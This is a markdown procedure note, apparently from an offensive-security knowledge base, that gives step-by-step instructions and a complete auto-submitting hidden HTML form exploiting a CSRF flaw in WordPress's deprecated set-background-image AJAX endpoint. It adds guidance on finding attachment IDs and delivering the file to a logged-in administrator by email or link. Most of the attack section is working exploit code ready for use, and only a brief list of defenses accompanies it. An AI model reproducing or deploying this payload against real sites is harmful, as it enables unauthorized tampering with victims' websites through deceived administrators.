---
tags:
  - csrf
  - html-payload
  - wordpress
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:42.759Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 852d98ba-6817-47e8-b186-49e73c04f0a7
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Malicious-CSRF-HTML-for-WordPress-Background-Change

## Summary

This procedure creates a simple HTML file with an auto-submitting form that exploits the lack of CSRF protection in WordPress's deprecated wp_set_background_image AJAX endpoint, allowing an attacker to forge a request changing the site's background image when submitted by an authenticated user.

## Description

The vulnerability stems from the wp_ajax_set-background-image action in wp-admin/includes/class-custom-background.php, which was deprecated in WordPress 3.5.0 but remains registered without nonce verification. This allows cross-site POST requests to modify the 'custom_background' theme option for users with 'edit_theme_options' capability. The HTML form mimics a legitimate request, posting attachment_id and size parameters to admin-ajax.php, targeting an existing media library image to repeat and obscure site text.

## Requirements

1. Knowledge of the target WordPress domain (replace [WP] in the HTML)
2. Access to the target's media library to identify an attachment_id (e.g., via prior recon or guessing low IDs like 5)
3. Text editor (e.g., Notepad, VS Code) to save the HTML file
4. Delivery method to the victim (e.g., email, shared link)

## Defense

Defensive measures and detection strategies:

- Enable WordPress nonces for all AJAX actions and deprecate unused endpoints fully
- Use Content-Security-Policy (CSP) headers to restrict form submissions to same-origin
- Monitor theme option changes in audit logs for anomalous updates
- Educate admins on phishing and avoid opening untrusted HTML files

## Objectives

1. Craft a payload that forges a theme modification request without authentication
2. Ensure the form targets a disruptive image (e.g., repeating thumbnail)
3. Prepare for delivery to trick the victim into submission

## Instructions

### Step 1: Draft the HTML Form

**Context**: Write the basic structure of the HTML with hidden form fields for the CSRF payload.

Create the following HTML code:

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <form id="csrf-form" action="https://[WP]/wp-admin/admin-ajax.php" method="POST" style="display: none;">
        <input type="hidden" name="attachment_id" value="5">
        <input type="hidden" name="action" value="set-background-image">
        <input type="hidden" name="size" value="thumbnail">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
    <p>If the form doesn't auto-submit, <button onclick="document.getElementById('csrf-form').submit();">click here</button>.</p>
</body>
</html>
```

> This creates an invisible form that auto-submits on load, forging the POST request. Replace [WP] with the target domain and 5 with a valid attachment_id.

### Step 2: Save and Test the File

**Context**: Save the file locally and verify it loads without errors in a browser.

Save as csrf-exploit.html and open in a browser (not on the target site yet). Ensure the form attempts to submit (check network tab for the request attempt).

> Expected: Form submission triggers; no errors in console. Note: It won't succeed without auth cookies.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[wordpress]]
- [[payload-creation]]
